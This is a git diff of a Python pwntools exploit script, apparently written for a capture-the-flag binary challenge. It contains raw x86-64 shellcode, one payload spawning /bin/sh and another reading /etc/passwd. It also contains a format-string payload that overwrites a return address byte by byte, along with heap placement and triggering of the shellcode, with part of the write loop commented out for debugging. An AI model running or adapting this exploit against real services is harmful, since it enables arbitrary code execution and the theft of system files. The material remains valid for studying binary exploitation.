@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 from pwn import *
 
 host = '0'
@@ -9,9 +10,12 @@ nombre = 'physics'
 
 
 # http://shell-storm.org/shellcode/files/shellcode-806.php
-shellcode = 'A' * 4 + "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
-
+shellcode = '\x90' * 0 + "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"
+shellcode = '\x90' * 0 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 objo = 0x602098
+shellcode = 'A' * 32
+
+assert len(shellcode) <= 32
 
 def main():
 	conn.recvuntil('name? : ')
@@ -46,7 +50,8 @@ def main():
 	shellcode_addr = leak + 0x30 + 4
 	if len(hex(shellcode_addr)) > 8:
 		print 'try again'
-		return
+		#conn.close()
+		#return
 	print 'shellcode addr:' + hex(shellcode_addr)
 	print ''
 	conn.recvuntil('> ')
@@ -66,39 +71,53 @@ def main():
 	sh_bytes = [b1, b2, b3]
 	#sh_bytes.sort(key=lambda x: x[1])
 
-	for sh_byte in sh_bytes:
-		pos, lenght = sh_byte
-		if lenght < 8:
-			print 'try again'
-			return
-		else:
-			conn.sendline('2')
-			conn.recvuntil(nombre)
-			print 'escribo:' + hex(lenght)
-			extra = len(str(lenght))
-			payload  = '%{:d}x'.format(lenght - (8 - extra))
-			payload += ' ' * (8 - extra)
-			payload += '%8$hhn'
-			payload += p64(ret_addr +  pos)
-			conn.sendline( payload )
-			conn.recvuntil('> ')
+	#for sh_byte in sh_bytes:
+	#	pos, lenght = sh_byte
+	#	if lenght < 8:
+	#		print 'try again'
+	#		conn.close()
+	#		return
+	#	else:
+	#		conn.sendline('2')
+	#		conn.recvuntil(nombre)
+	#		print 'escribo:' + hex(lenght)
+	#		extra = len(str(lenght))
+	#		payload  = '%{:d}x'.format(lenght - (8 - extra))
+	#		payload += ' ' * (8 - extra)
+	#		payload += '%8$hhn'
+	#		payload += p64(ret_addr +  pos)
+	#		conn.sendline( payload )
+	#		conn.recvuntil('> ')
 
 	# place shellcode on heap
 	conn.sendline('3')
 	conn.sendline(shellcode)
 	conn.recvuntil('> ')
 
+	# debug
+	conn.sendline('2')
+	conn.recvuntil(nombre)
+	payload  = 'a%7$x   '
+	payload += p64(shellcode_addr)
+	conn.sendline( payload )
+	conn.recvline()
+	line = conn.recvline()
+	print 'linea:' + line
+	conn.recvuntil('> ')
+	# f\xba\xff\x0fH1�\x05H1\xff@\x80�H\x89�H1�\x0f\x05H1�<
+	#1�H\xbbѝ\x96\x91Ќ\x97\xffH��ST_\x99RWT^\xb0;\x0f\x05
+
+	# debug
+
 	# trigger shellcode
 	conn.sendline('4')
 	conn.sendline('y')
 	conn.recvuntil('bye')
-	conn.interactive()
+	#conn.interactive()
+	conn.close()
 
 if __name__ == '__main__':
 	try:
 		main()
 	except KeyboardInterrupt as e:
 		pass
-
-#malloc = 0x017086a0
-#leak   = 0x01708260
